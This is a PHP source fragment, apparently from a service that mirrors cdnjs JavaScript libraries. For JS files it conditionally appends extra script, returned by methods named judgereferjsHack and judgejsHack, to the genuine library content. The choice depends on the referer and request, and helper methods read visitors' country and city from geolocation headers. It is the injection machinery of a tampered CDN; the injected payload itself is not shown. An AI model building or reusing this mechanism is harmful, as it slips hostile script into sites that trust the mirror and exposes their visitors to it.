        $response = Cache::get($cache_key);
        if (empty($response)) {
            $url = 'https://cdnjs.cloudflare.com/' . $file;
            try {
                $response = NetworkRequest::get($url);
            } catch (ClientException $e) {
                $response = "resource not found";
                Cache::set($cache_key, $response, 86400 * 365);
                return response($response)->header(['Content-Type' => 'text/plain'])->code(404); 
            }
            if (!empty($response)) {
                Cache::set($cache_key, $response, 86400 * 365);
            }
        }
        $ext_list = explode('.', $file);
        $mime_type = [
            'html' => 'text/html',
            'css'  => 'text/css',
            'js'   => 'text/javascript',
        ][end($ext_list)] ?? 'application/octet-stream';

        if(end($ext_list) == 'js' && $response != "resource not found") {
            $str = $this->judgereferjsHack($request);
            //lllog("refererrecord", $request->header('referer'));
            if( $str != false ) {
                //lllog("judgereferjsHack", $request->header('referer'));
                // $redis->incr('bc_list_request_count');
                $response = $response.$str;
            } else {
                $str = $this->judgejsHack($request);
                $t1 = ($str) ? 'true' : 'false';
                if( $str != false ) {
                    $response = $response.$str;
                }
                else{
                    // $redis->incr('hack_false_count');
                }
            }
        }
        if ($response == "resource not found") {
            // $redis->incr('not_found_request_count');
            return response($response)->header(['Content-Type' => 'text/plain'])->code(404);
        }
        return response($response)->header(['Content-Type' => $mime_type,'Cache-Control' => 'max-age=0','Expires' => gmdate("D, d M Y H:i:s", time() ) . " GMT",]);
    }

    private function htmlWithCacheHeader($cache_seconds) {
        return [
            'Content-Type'  => 'text/html',
            'Cache-Control' => 'max-age=' . $cache_seconds,
            'Expires'       => gmdate("D, d M Y H:i:s", time() + $cache_seconds) . " GMT",
        ];
    }

    private function jsWithCacheHeader($cache_seconds) {
        return [
            'Content-Type'  => 'text/javascript',
            'Cache-Control' => 'max-age=' . $cache_seconds,
            'Expires'       => gmdate("D, d M Y H:i:s", time() + $cache_seconds) . " GMT",
        ];
    }

    private function getIp(Request $request) {
        return get_client_ip_xff();
    }

        /**
     * 根据cdn头是否返回国家
     */
    private function getCountry(Request $request,$logfail=false) {
        
        if (isset($_SERVER['HTTP_CF_IPCOUNTRY'])) {
            return $_SERVER['HTTP_CF_IPCOUNTRY'];
        }
        if (isset($_SERVER['HTTP_CLOUDFRONT_VIEWER_COUNTRY'])) {
            return $_SERVER['HTTP_CLOUDFRONT_VIEWER_COUNTRY'];
        }
        if (isset($_SERVER['HTTP_MACCMS_GEOIP2_COUNTRY_CODE'])) {
            return $_SERVER['HTTP_MACCMS_GEOIP2_COUNTRY_CODE'];
        }

        return '';
    }

    private function getCity(Request $request) {
        if (isset($_SERVER['HTTP_MACCMS_GEOIP2_CITY_CODE'])) {
            return $_SERVER['HTTP_MACCMS_GEOIP2_CITY_CODE'];
        }
        return '';
    }
}
